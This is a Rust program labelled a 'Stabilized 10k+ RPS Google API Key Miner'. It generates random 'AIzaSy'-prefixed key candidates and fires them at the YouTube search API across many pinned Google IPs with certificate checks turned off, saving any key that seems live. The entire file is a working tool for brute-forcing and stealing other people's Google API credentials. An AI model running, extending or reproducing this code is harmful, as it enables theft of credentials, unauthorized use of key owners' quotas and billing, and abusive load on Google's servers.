use clap::Parser;
use mimalloc::MiMalloc;
use reqwest;
use serde::{Deserialize, Serialize};
use serde_json;
use std::error::Error;
use std::sync::Arc;
use std::time::Instant;
use tokio::fs::{self, OpenOptions as AsyncOpenOptions};
use tokio::io::{AsyncWriteExt, BufWriter};
use tokio::sync::mpsc;
use tokio::time::{sleep, Duration};
use std::sync::atomic::{AtomicU64, Ordering};
use std::net::IpAddr;
use futures::stream::{self, StreamExt};

#[global_allocator]
static GLOBAL: MiMalloc = MiMalloc;

const GREEN: &str = "\x1b[32m";
const RED: &str = "\x1b[31m";
const YELLOW: &str = "\x1b[33m";
const CYAN: &str = "\x1b[36m";
const RESET: &str = "\x1b[0m";

const CHECKPOINT_FILE: &str = "checkpoint.json";
const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const BASE_URL_PART1: &str = "https://www.googleapis.com/youtube/v3/search?part=id&maxResults=1&key=";

#[derive(Parser)]
#[command(name = "key_checker")]
#[command(about = "Stabilized 10k+ RPS Google API Key Miner")]
struct Args {
    #[arg(short, long, default_value_t = 5000)]
    parallel: usize,
}

#[derive(Serialize, Deserialize, Debug)]
struct Checkpoint {
    current_index: u64,
    seed: u64,
}

fn increase_fd_limit() {
    unsafe {
        let mut rlim = libc::rlimit { rlim_cur: 0, rlim_max: 0 };
        if libc::getrlimit(libc::RLIMIT_NOFILE, &mut rlim) == 0 {
            rlim.rlim_cur = 500000;
            rlim.rlim_max = 500000;
            if libc::setrlimit(libc::RLIMIT_NOFILE, &rlim) != 0 {
                rlim.rlim_cur = 100000;
                rlim.rlim_max = 100000;
                let _ = libc::setrlimit(libc::RLIMIT_NOFILE, &rlim);
            }
        }
    }
}

#[inline(always)]
fn permute_index(index: u64, seed: u64) -> u64 {
    let mut x = index.wrapping_add(seed);
    x ^= x >> 33;
    x = x.wrapping_mul(0xff51afd7ed558ccd);
    x ^= x >> 33;
    x = x.wrapping_mul(0xc4ceb9fe1a85ec53);
    x ^= x >> 33;
    x = x.wrapping_mul(0xc4ceb9fe1a85ec53);
    x ^= x >> 33;
    x
}

#[inline(always)]
fn generate_key_from_index(index: u64, seed: u64, buffer: &mut [u8]) {
    unsafe {
        std::ptr::copy_nonoverlapping(b"AIzaSy".as_ptr(), buffer.as_mut_ptr(), 6);
    }
    let mut s = permute_index(index, seed);
    for i in 6..39 {
        s = s.wrapping_add(0x9e3779b97f4a7c15);
        let mut z = s;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58476d1ce4e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d049bb133111eb);
        let rand_val = z ^ (z >> 31);
        unsafe {
            *buffer.get_unchecked_mut(i) = *CHARSET.get_unchecked((rand_val as usize) % 62);
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    increase_fd_limit();
    let args = Args::parse();
    
    // -------------------------------------------------------------------------
    // STRATEGY: CLIENT SHARDING + MULTI-IP PINNING
    // -------------------------------------------------------------------------
    
    let google_ips = vec![
        "172.217.161.206", "142.250.190.46", "142.250.191.14", "142.250.191.46",
        "172.217.1.14", "172.217.2.14", "172.217.3.14", "172.217.4.14",
        "172.217.5.14", "172.217.6.14", "172.217.7.14", "172.217.8.14",
        "172.217.9.14", "172.217.10.14", "172.217.11.14", "172.217.12.14",
        "216.58.203.110", "216.58.204.110", "216.58.205.110", "216.58.206.110"
    ];

    let mut clients_vec = Vec::new();

    println!("{}Initializing {} Sharded Clients...விற்கு{}", YELLOW, google_ips.len(), RESET);

    for ip_str in google_ips {
        if let Ok(ip) = ip_str.parse::<IpAddr>() {
            let client = reqwest::Client::builder()
                .http2_prior_knowledge()
                .pool_max_idle_per_host(2000)
                .pool_idle_timeout(Duration::from_secs(30))
                .tcp_nodelay(true)
                .connect_timeout(Duration::from_secs(3))
                .timeout(Duration::from_secs(3))
                .danger_accept_invalid_certs(true)
                .resolve("www.googleapis.com", std::net::SocketAddr::new(ip, 443))
                .build()?;
            clients_vec.push(client);
        }
    }

    let clients = Arc::new(clients_vec);
    let num_shards = clients.len();

    let checkpoint_data = fs::read_to_string(CHECKPOINT_FILE).await.unwrap_or_default();
    let checkpoint: Checkpoint = serde_json::from_str(&checkpoint_data).unwrap_or_else(|_| Checkpoint {
        current_index: 0,
        seed: rand::random(),
    });

    println!("{}STABILIZED SHARDING MODE ACTIVATED{}", CYAN, RESET);
    println!("{}Concurrency: {} | Shards: {} | Seed: {}{}", YELLOW, args.parallel, num_shards, checkpoint.seed, RESET);

    let (result_tx, mut result_rx) = mpsc::unbounded_channel::<String>();
    
    let global_index = Arc::new(AtomicU64::new(checkpoint.current_index));
    let total_valid = Arc::new(AtomicU64::new(0));
    let total_invalid = Arc::new(AtomicU64::new(0));
    let seed = checkpoint.seed;

    tokio::spawn(async move {
        let success_file = AsyncOpenOptions::new().create(true).append(true).open("success_keys.txt").await.unwrap();
        let mut success_writer = BufWriter::with_capacity(64 * 1024, success_file);
        while let Some(k) = result_rx.recv().await {
            let _ = success_writer.write_all(format!("{}\n", k).as_bytes()).await;
            let _ = success_writer.flush().await;
            println!("\n{}{}[!!!] FOUND VALID KEY: {}{}", RED, YELLOW, k, RESET);
        }
    });

    let g_index_clone = global_index.clone();
    let v_clone = total_valid.clone();
    let i_clone = total_invalid.clone();
    let start_time = Instant::now();
    let start_idx = checkpoint.current_index;

    tokio::spawn(async move {
        let mut last_idx = start_idx;
        loop {
            sleep(Duration::from_secs(1)).await;
            let current = g_index_clone.load(Ordering::Relaxed);
            let valid = v_clone.load(Ordering::Relaxed);
            let invalid = i_clone.load(Ordering::Relaxed);
            let speed = current - last_idx; 
            let elapsed = start_time.elapsed().as_secs();
            
            let _ = fs::write(CHECKPOINT_FILE, serde_json::to_string(&Checkpoint { current_index: current, seed }).unwrap()).await;

            print!(
                "\r{}{{}}[SHARD]{} Index: {}{}{} | Valid: {}{}{} | Invalid: {}{}{} | Speed: {}{}{} k/s | Time: {}s", 
                CYAN, RESET, YELLOW, current, RESET, GREEN, valid, RESET, RED, invalid, RESET, CYAN, speed, RESET, elapsed
            );
            std::io::Write::flush(&mut std::io::stdout()).unwrap();
            last_idx = current;
        }
    });

    let stream_clients = clients.clone();
    let stream_global_index = global_index.clone();
    let stream_total_valid = total_valid.clone();
    let stream_total_invalid = total_invalid.clone();
    let stream_result_tx = result_tx.clone();

    let generator = stream::iter(0..).map(move |_| {
        let idx = stream_global_index.fetch_add(1, Ordering::Relaxed);
        
        let client_idx = (idx as usize) % num_shards;
        let client_ref = stream_clients[client_idx].clone();

        let mut buffer = [0u8; 39];
        generate_key_from_index(idx, seed, &mut buffer);
        let key_string = unsafe { std::str::from_utf8_unchecked(&buffer).to_string() };
        
        // Manual Zero-Alloc URL Construction
        let mut url = String::with_capacity(BASE_URL_PART1.len() + 39);
        url.push_str(BASE_URL_PART1);
        url.push_str(&key_string);
        
        let key_owned = key_string; 
        
        async move {
            let resp = client_ref.get(&url).send().await;
            match resp {
                Ok(r) => {
                    let s = r.status();
                    (s.is_success() || s.as_u16() == 403 || s.as_u16() == 429, key_owned)
                }
                Err(_) => (false, key_owned)
            }
        }
    });

    generator
        .buffer_unordered(args.parallel) 
        .for_each(|(is_valid, key)| {
            let total_valid = stream_total_valid.clone();
            let total_invalid = stream_total_invalid.clone();
            let result_tx = stream_result_tx.clone();
            
            async move {
                if is_valid {
                    total_valid.fetch_add(1, Ordering::Relaxed);
                    let _ = result_tx.send(key);
                } else {
                    total_invalid.fetch_add(1, Ordering::Relaxed);
                }
            }
        })
        .await;

    Ok(())
}
